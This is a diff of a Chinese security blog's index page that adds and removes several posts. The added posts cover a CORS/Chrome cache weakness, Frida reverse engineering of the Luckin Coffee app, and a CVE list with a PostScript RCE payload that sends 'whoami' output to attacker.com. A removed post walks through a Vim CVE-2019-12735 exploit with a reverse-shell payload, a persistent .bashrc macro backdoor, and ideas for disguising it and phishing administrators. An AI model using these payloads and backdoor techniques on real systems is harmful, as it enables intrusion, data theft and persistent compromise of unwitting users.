@@ -292,6 +292,586 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/关于CORS的一些记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/13/关于CORS的一些记录/" itemprop="url">记一个frida调试瑞幸的过程</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-13T13:21:30+08:00">
+                2020-01-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p><a href="https://b.cp0.win/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E5%90%88CORS%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2.php" target="_blank" rel="noopener">Chrome缓存和CORS</a>这个文章里记录的Chrome缓存存在问题，在<code>Access-Control-Allow-Origin:* 且Access-Control-Allow-Credentials: false</code>的情况下可能可以获取到敏感信息（credentials可能是true也行），</p>
+<h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>先说一下关于这两个头部值的一些问题：</p>
+<ol>
+<li>当<code>Access-Control-Allow-Origin:*</code>时，credentials不能设置为true，设置为true可能会报错？（不确定），可以设置为false，设置为false不报错，不设置默认应该也是false，即允许任何域时不允许ajax请求传递敏感头部</li>
+<li>当<code>Access-Control-Allow-Origin: 某域名</code>时，credentials设置true则是常见的配置漏洞，设置为false时浏览器如果发起ajax时设置withcredentials为true则报错</li>
+<li>当不设置时默认为null，即拒绝除本域以外所有的域名<h2 id="0x02-想法"><a href="#0x02-想法" class="headerlink" title="0x02 想法"></a>0x02 想法</h2>如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了<code>Access-Control-Allow-Origin:*</code>，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。<br>比较一下这个漏洞和jsonp、csrf的差别：<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3>得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口<h3 id="一般csrf"><a href="#一般csrf" class="headerlink" title="一般csrf"></a>一般csrf</h3>一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据<h3 id="这个缓存漏洞"><a href="#这个缓存漏洞" class="headerlink" title="这个缓存漏洞"></a>这个缓存漏洞</h3>一般的通过js去拉取数据需要cors配置为<code>Access-Control-Allow-Origin: 某域名</code>且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件：</li>
+<li>没有csrf防御</li>
+<li>存在敏感信息或有利用价值的东西</li>
+<li>origin为星号</li>
+<li>用户在这之前用Chrome浏览器访问过该接口</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/记一个frida调试瑞幸的过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/13/记一个frida调试瑞幸的过程/" itemprop="url">记一个frida调试瑞幸的过程</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-13T13:21:30+08:00">
+                2020-01-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/app逆向/" itemprop="url" rel="index">
+                    <span itemprop="name">app逆向</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h2><ol>
+<li>通过pip安装frida</li>
+<li>下载对应的frida-server到安卓端，进去运行server<h2 id="0x01-基本操作"><a href="#0x01-基本操作" class="headerlink" title="0x01 基本操作"></a>0x01 基本操作</h2></li>
+<li>adb shell dumpsys activity top即可查看该app的包名</li>
+<li>frida-trace -U -i open com.lucky.luckyclient    调用ptrace附着在进程上进行调试，-p指定pid</li>
+<li>Frida-ps -U  列出安卓机器上运行的进程<h2 id="0x02-尝试使用Frida-unpack"><a href="#0x02-尝试使用Frida-unpack" class="headerlink" title="0x02 尝试使用Frida-unpack"></a>0x02 尝试使用Frida-unpack</h2></li>
+<li><a href="https://github.com/dstmath/frida-unpack" target="_blank" rel="noopener">Frida-unpack</a>，先将安卓机器里的libart.so拉出来到Mac上，一般目录是在/system/lib64下，然后通过nm libart.so| grep OpenMemory命令查看函数名，我这边看了是和脚本里一样的就不改了。</li>
+<li><p>clone过来后，修改openmemory.js里的路径改为对应的包名路径，这里要注意的是不要随意修改路径，可能会导致没权限写入，修改对应包名就行。</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var file = new File("/data/data/com.lucky.luckyclient/dumps" + dex_size + ".dex", "wb")</span><br></pre></td></tr></table></figure>
+<p> 这里改成这样</p>
+</li>
+<li><p>执行命令：</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.lucky.luckyclient -l OpenMemory.js</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到hook在进行了，但是由于壳比较新，中途被检测到后强制中断失败了</p>
+<h2 id="0x03-试试别的思路"><a href="#0x03-试试别的思路" class="headerlink" title="0x03 试试别的思路"></a>0x03 试试别的思路</h2></li>
+<li>尝试下载了历史版本2.6.0，发现是腾讯加固，使用上面的方式可以进行dumps</li>
+<li>但是由于版本低，登录时获取不了短信，先不管他，试着用dex2jar逆向dex试试，发现成功转成jar</li>
+<li>通过jd-gui一个个翻翻看在文件“dumps5046568-dex2jar.jar”中的com.lucky.lib.http2.c.class中找到了AES加密算法</li>
+<li></li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/Untitled/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/17/Untitled/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-17T18:05:11+08:00">
+                2019-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/09/热门CVE记录（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/09/热门CVE记录（一）/" itemprop="url">热门CVE记录（一）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-09T17:40:30+08:00">
+                2019-10-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CVE记录/" itemprop="url" rel="index">
+                    <span itemprop="name">CVE记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>CVE-2019-16920 | 20191005 | <a href="https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html" target="_blank" rel="noopener"> CVE-2019-16920 poc</a></p>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="xstream"><a href="#xstream" class="headerlink" title="xstream"></a>xstream</h3><p>CVE-2019-10173 | 20190720 | 反序列化</p>
+<h2 id="jira"><a href="#jira" class="headerlink" title="jira"></a>jira</h2><p>CVE-2019-14994 | 20190919 | url path traversal | <a href="https://zh-cn.tenable.com/blog/cve-2019-14994-url-path-traversal-vulnerability-in-jira-service-desk-leads-to-information" target="_blank" rel="noopener">/..;/</a><br>CVE-2019–11581｜20190601｜rce  | 印象笔记<br>CVE-2019-8451 | 20190925 | ssrf | <a href="https://lh5.googleusercontent.com/I3TRyJO61dcd_0VPMpTfER-9fMjPb4-aj1lJHej6eo9-b1jqjI-FMbeX44PJlWOs_Pv3VkPS3Fi-wYEutpukOUpBRqllY6SMxjKaJnRxIEunP3VzOZR1vewHJvPsgdHWDujHRbuD" target="_blank" rel="noopener">ssrf png</a></p>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="joomla3-4-6rce-｜-20191008｜exp"><a href="#joomla3-4-6rce-｜-20191008｜exp" class="headerlink" title="joomla3.4.6rce ｜ 20191008｜exp"></a>joomla3.4.6rce ｜ 20191008｜<a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">exp</a></h3><h3 id="php-RCE-CVE-2019-11043-20191024-攻击工具"><a href="#php-RCE-CVE-2019-11043-20191024-攻击工具" class="headerlink" title="php RCE CVE-2019-11043  | 20191024 | 攻击工具"></a>php RCE CVE-2019-11043  | 20191024 | <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">攻击工具</a></h3><h2 id="Nhttpd"><a href="#Nhttpd" class="headerlink" title="Nhttpd"></a>Nhttpd</h2><p>CVE-2019-16278 ｜ 20191015 ｜ url path traversal ice <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits/src/branch/master/CVE-2019-16278.sh" target="_blank" rel="noopener">CVE-2019-16278</a></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Image / Video converters : Image magick : CVE-2016–3718(fill ‘url(<a href="http://attacker.com/)&#39;" target="_blank" rel="noopener">http://attacker.com/)&#39;</a>) CVE-2016–3718 / FFMPEG : CVE-2017–9993 (gen_xbin_playlist(playlist_location))</p>
+<h2 id="postscript"><a href="#postscript" class="headerlink" title="postscript"></a>postscript</h2><p>CVE-2016-3714<br>CVE-2018-16509<br>CVE-2019-6116<br>CVE-2016-7976 RCE on PDF upload:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">currentdevice null true mark /OutputICCProfile (%pipe%curl attacker.com/?a=$(whoami|base64) )</span><br><span class="line">.putdeviceparams</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/scapy发送TLS自定义包/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -386,7 +966,7 @@
         
           
             <h2 id="00-安装配置scapy"><a href="#00-安装配置scapy" class="headerlink" title="00 安装配置scapy"></a>00 安装配置scapy</h2><p>直接从github上下载scapy源码，然后进入到目录中运行即可。<br>由于TLS并不是默认开启的layer，所以需要在配置项中的layer里加入tls。<br>运行后输入TLS查看是否报错，如果没有报错说明TLS层的启用正常。</p>
-<h2 id="01-构造TLS请求"><a href="#01-构造TLS请求" class="headerlink" title="01 构造TLS请求"></a>01 构造TLS请求</h2><p>经过一系列的研究尝试，得出如下构造hello包的代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sn = ServerName(servername="<span class="tag">&lt;<span class="name">put</span> <span class="attr">server</span> <span class="attr">name</span> <span class="attr">here</span>&gt;</span>\x00\x00\x00\0")</span><br><span class="line">ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]),</span><br><span class="line">               TLS_Ext_ServerName(servernames=[sn]),</span><br><span class="line">               TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]),  # noqa: E501</span><br><span class="line">             #  TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]),</span><br><span class="line">               TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss",</span><br><span class="line">                                                     "sha256+rsa"])]</span><br><span class="line">p = TLSClientHello(ciphers=0x1301, ext=ext)</span><br><span class="line">TLSClientAutomaton(server="mail.guahao.com",dport=995,client_hello=p).run()</span><br></pre></td></tr></table></figure></p>
+<h2 id="01-构造TLS请求"><a href="#01-构造TLS请求" class="headerlink" title="01 构造TLS请求"></a>01 构造TLS请求</h2><p>经过一系列的研究尝试，得出如下构造hello包的代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sn = ServerName(servername="<span class="tag">&lt;<span class="name">put</span> <span class="attr">server</span> <span class="attr">name</span> <span class="attr">here</span>&gt;</span>\x00\x00\x00\0")</span><br><span class="line">ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]),</span><br><span class="line">               TLS_Ext_ServerName(servernames=[sn]),</span><br><span class="line">               TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]),  # noqa: E501</span><br><span class="line">             #  TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]),</span><br><span class="line">               TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss",</span><br><span class="line">                                                     "sha256+rsa"])]</span><br><span class="line">p = TLSClientHello(ciphers=0x1301, ext=ext)</span><br><span class="line">TLSClientAutomaton(server="mail.xxxx.com",dport=995,client_hello=p).run()</span><br></pre></td></tr></table></figure></p>
 <p>Servername那个参数可以替换成任意的服务器名即可达到我们的目的</p>
 
           
@@ -1224,630 +1804,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/" itemprop="url">基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-20T15:40:30+08:00">
-                2019-06-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/客户端安全/" itemprop="url" rel="index">
-                    <span itemprop="name">客户端安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用进行了一些研究。由于本人是个菜的抠脚的脚本小子，因此并不会在这篇文章中去给大家解释漏洞原因，作为脚本小子我只关心如何利用。至于漏洞原因的一些解释可以去原作者的git上去看<a href="https://github.com/numirias/security/blob/master/doc/2019-06-04%5C_ace-vim-neovim.md" title="原作者GITHUB" target="_blank" rel="noopener">原作者GITHUB</a></p>
-<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>先讲一下如何漏洞复现，复现该漏洞的基本条件是：</p>
-<ol>
-<li>Vim版本在影响范围内，目前大部分版本都有受影响，至少我最近开启的GCP上的ubuntu默认的vim版本在8.0左右是受影响的。</li>
-<li>必须开启modeline选项，这个选项很关键，我的GCP上默认是不开启的，所以严重降低了该漏洞的危害，不太确定低版本或者是一些衍生版本的vim会不会默认开启。</li>
-</ol>
-<h3 id="复现poc1过程："><a href="#复现poc1过程：" class="headerlink" title="复现poc1过程："></a>复现poc1过程：</h3><ol>
-<li>在～/.vimrc中加入set modeline确保开启该选项<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. 使用原作者的第一个poc直接写入一个文件并保存：\`:!uname -a||" vi:fen:fdm=expr:fde=assertfails("source\!\ \%"):fdl=0:fdt="</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>`3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本</p>
-<h3 id="复现poc2过程："><a href="#复现poc2过程：" class="headerlink" title="复现poc2过程："></a>复现poc2过程：</h3><p>先来看看原作者在git上写着的poc2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x1b\[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert\_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b\[1G\x16\x1b\[KNothing here."\x16\x1b\[D \\n</span><br></pre></td></tr></table></figure></p>
-<p>如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）：</p>
-<ol>
-<li>这里面涉及到的十六进制比如\x1b是需要通过二进制编辑器直接改成二进制的，复制黏贴是不行的。将poc中所有的十六进制位置编辑成二进制即可。</li>
-<li>反斜杠的问题，原poc中作者为了转义特殊符号来显示所以多加了反斜杠，将所有涉及到转义的字符前面多一个的反斜杠“\”去掉就可以了</li>
-<li>必要的话将最后的\n直接改成回车，如果\n在你的文本里没有被解释成回车的话</li>
-</ol>
-<p>按照上面说的流程修改完poc后，我们在测试机本地起个nc监听：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure></p>
-<p>最后打开poc2即可看到nc获取到了反弹链接。</p>
-<h2 id="0x02-改造poc2加入宏后门"><a href="#0x02-改造poc2加入宏后门" class="headerlink" title="0x02 改造poc2加入宏后门"></a>0x02 改造poc2加入宏后门</h2><p>先来说说为什么要加入宏后门，poc2中有个问题，就是当vim打开一次文档后，就不会在携带有恶意代码了从而变成一个普通文档。虽然我们可以通过第一次建立连接后下载木马来获得持久的后门，但这个方式不在讨论范围内了。这里我的想法是先实现每次打开文档都会获得反弹链接的持久后门，而不是依赖于下载外部木马。<br>Poc2其实加了很多代码用来伪装成正常文件内容，使人即使打开文件也不会察觉到里面藏有恶意代码，而poc1则会很明显看到代码执行。这个伪装有几个特点：</p>
-<ol>
-<li>受影响版本的vim和cat打开都不会显示插入的恶意代码</li>
-<li>cat -v可以看到恶意代码</li>
-<li>不同版本的cat可能会看到一些显示的差异，但是恶意代码依旧是看不到的</li>
-</ol>
-<p>为了不破坏伪装同时做成可持续的后门，比较菜的我只想到了利用vim宏来达到这个效果。</p>
-<h3 id="基本实现思路"><a href="#基本实现思路" class="headerlink" title="基本实现思路"></a>基本实现思路</h3><p>首先，我们希望的是每次vim文件都会执行代码，那么有没有可能使其每次vim文件的时候都执行一边vim宏呢？这是可能的，过程如下：</p>
-<ol>
-<li>在vim窗口录制宏：q{寄存器名称}，录制完成后再按下q按键停止</li>
-<li>在～/.bashrc中写入alias vim=vim -c ‘@{寄存器名称}’ 以及shopt -s expand_aliases，通过alias替换vim别名的方式来打开文件默认执行宏</li>
-<li>那么只要管理员重新登录shell，以后不管他vim什么文件都会执行我们写在宏里的命令</li>
-</ol>
-<p>接下来要做的就是在poc2中合适的地方加入录制宏的命令，其实poc2中那些十六进制比如\x1b是ESC的意思，可以联想到这个应该是vim中切换模式的按键，因此我们可以通过在ESC之后需要执行的命令之前加入qy来开始录制宏y，在命令执行完后某个合适的位置加入q来终止宏的录制。在试了很多次后最终有了以下exp：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_%E6%AD%A3%E5%B8%B8%E7%89%88vim%5C_CVE-2019-12735.txt" title="exp1" target="_blank" rel="noopener">后门exp1</a></p>
-<h3 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h3><p>上面那个poc依旧存在几个问题：</p>
-<ol>
-<li>每次执行都会疯狂的往bashrc里插入alias那两句，只要vim一次就插一次，这很不好</li>
-<li>没有伪装成正常文件内容</li>
-</ol>
-<p>为了改善第一个问题，我们可以通过分开执行两次命令，然后宏只录制第一个命令（即反弹shell），第二个插入命令只执行一次。这听起来很容易，其实做起来并不容易……多次执行会遇到很多问题，因为我太菜了所以花了很长的时间。<br>改善第二个问题，其实也远远没有想的那么简单，以为只是在空白处插入文本即可，其实不是的，原poc中的命令会对这些文本产生影响，所以写入什么样的文本都还是有点考究的。<br>这边给出一个最终将这两个问题都解决了并且伪装成一个PHP一句话的案例：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_webshell%E4%BC%98%E5%8C%96%E7%89%88%5C_vim%5C_CVE-2019-12735.txt" title="伪装成webshell版本" target="_blank" rel="noopener">后门exp2</a><br>最后还有个vim历史命令里会残留执行的命令的问题，这个可以通过插入一些垃圾vim命令来伪装。</p>
-<h2 id="0x03-思考总结"><a href="#0x03-思考总结" class="headerlink" title="0x03 思考总结"></a>0x03 思考总结</h2><p>考虑到这个漏洞需要开启modeline选项，所以危害严重降低。不过还是可以通过钓鱼来碰运气的，因为你说不好就有生产环境的vim开了这个。假设他们开了那么这个就会成为一个Linux上类似于win上的点击病毒，只要vim了就会中招，而且会随着原文件的copy同步来扩大。还有一些mbp用户也会中招，比如你在网上散播伪装成nginx.conf的文件，诱导那些可怜的开发者来下载使用。<br>甚至于我们可以伪装成一个一句话木马上传到目标站点，至于他能不能执行都不重要，直接发邮件给管理员伪装成安全公司来告知他们扫描发现木马，建议他们通过vim打开文件确认后删除……<br>总之开开脑洞还是可能有利用场景的，不过我个人认为吧，没错这个漏洞就是鸡肋玩具！<br>最后如果有朋友知道具体哪些版本和可能的场景下vim会默认打开modeline选项，还请告知谢谢啦。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
